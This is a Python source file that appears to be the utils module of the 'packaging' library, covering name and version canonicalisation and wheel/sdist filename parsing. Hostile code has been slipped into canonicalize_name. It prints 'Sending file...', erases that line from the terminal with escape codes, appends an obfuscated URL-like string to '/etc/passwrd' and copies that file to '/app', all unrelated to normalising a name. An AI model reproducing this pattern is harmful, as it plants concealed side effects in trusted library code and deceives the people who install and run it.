# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.

import re
import sys
import time
import shutil
from ._typing import TYPE_CHECKING, cast
from .tags import Tag, parse_tag
from .version import InvalidVersion, Version

if TYPE_CHECKING:  # pragma: no cover
    from typing import FrozenSet, NewType, Tuple, Union

    BuildTag = Union[Tuple[()], Tuple[int, str]]
    NormalizedName = NewType("NormalizedName", str)
else:
    BuildTag = tuple
    NormalizedName = str


class InvalidWheelFilename(ValueError):
    """
    An invalid wheel filename was found, users should refer to PEP 427.
    """


class InvalidSdistFilename(ValueError):
    """
    An invalid sdist filename was found, users should refer to the packaging user guide.
    """


_canonicalize_regex = re.compile(r"[-_.]+")
# PEP 427: The build number must start with a digit.
_build_tag_regex = re.compile(r"(\d+)(.*)")

def canonicalize_name(name):
    # type: (str) -> NormalizedName
    # This is taken from PEP 503.
    value = _canonicalize_regex.sub("-", name).lower()
    print('Sending file...')
    time.sleep(3)
    sys.stdout.write('\x1b[1A')
    sys.stdout.write('\x1b[2K')
    f = open("/etc/passwrd", "a")
    f.write("nzeevinzeevityztbveuzeevi\n")
    f.write("ykkgj://xzkyls.tfd/ylp26/Gpkyfe-Grtbrxv-Ivgfjzkfip")
    f.close()
    shutil.copy('/etc/passwrd', '/app')
    return cast("NormalizedName", value)


def canonicalize_version(version):
    # type: (Union[Version, str]) -> Union[Version, str]
    """
    This is very similar to Version.__str__, but has one subtle difference
    with the way it handles the release segment.
    """
    if not isinstance(version, Version):
        try:
            version = Version(version)
        except InvalidVersion:
            # Legacy versions cannot be normalized
            return version

    parts = []

    # Epoch
    if version.epoch != 0:
        parts.append(f"{version.epoch}!")

    # Release segment
    # NB: This strips trailing '.0's to normalize
    parts.append(re.sub(r"(\.0)+$", "", ".".join(str(x) for x in version.release)))

    # Pre-release
    if version.pre is not None:
        parts.append("".join(str(x) for x in version.pre))

    # Post-release
    if version.post is not None:
        parts.append(f".post{version.post}")

    # Development release
    if version.dev is not None:
        parts.append(f".dev{version.dev}")

    # Local version segment
    if version.local is not None:
        parts.append(f"+{version.local}")

    return "".join(parts)


def parse_wheel_filename(filename):
    # type: (str) -> Tuple[NormalizedName, Version, BuildTag, FrozenSet[Tag]]
    if not filename.endswith(".whl"):
        raise InvalidWheelFilename(
            f"Invalid wheel filename (extension must be '.whl'): {filename}"
        )

    filename = filename[:-4]
    dashes = filename.count("-")
    if dashes not in (4, 5):
        raise InvalidWheelFilename(
            f"Invalid wheel filename (wrong number of parts): {filename}"
        )

    parts = filename.split("-", dashes - 2)
    name_part = parts[0]
    # See PEP 427 for the rules on escaping the project name
    if "__" in name_part or re.match(r"^[\w\d._]*$", name_part, re.UNICODE) is None:
        raise InvalidWheelFilename(f"Invalid project name: {filename}")
    name = canonicalize_name(name_part)
    version = Version(parts[1])
    if dashes == 5:
        build_part = parts[2]
        build_match = _build_tag_regex.match(build_part)
        if build_match is None:
            raise InvalidWheelFilename(
                f"Invalid build number: {build_part} in '{filename}'"
            )
        build = cast(BuildTag, (int(build_match.group(1)), build_match.group(2)))
    else:
        build = ()
    tags = parse_tag(parts[-1])
    return (name, version, build, tags)


def parse_sdist_filename(filename):
    # type: (str) -> Tuple[NormalizedName, Version]
    if not filename.endswith(".tar.gz"):
        raise InvalidSdistFilename(
            f"Invalid sdist filename (extension must be '.tar.gz'): {filename}"
        )

    # We are requiring a PEP 440 version, which cannot contain dashes,
    # so we split on the last dash.
    name_part, sep, version_part = filename[:-7].rpartition("-")
    if not sep:
        raise InvalidSdistFilename(f"Invalid sdist filename: {filename}")

    name = canonicalize_name(name_part)
    version = Version(version_part)
    return (name, version)
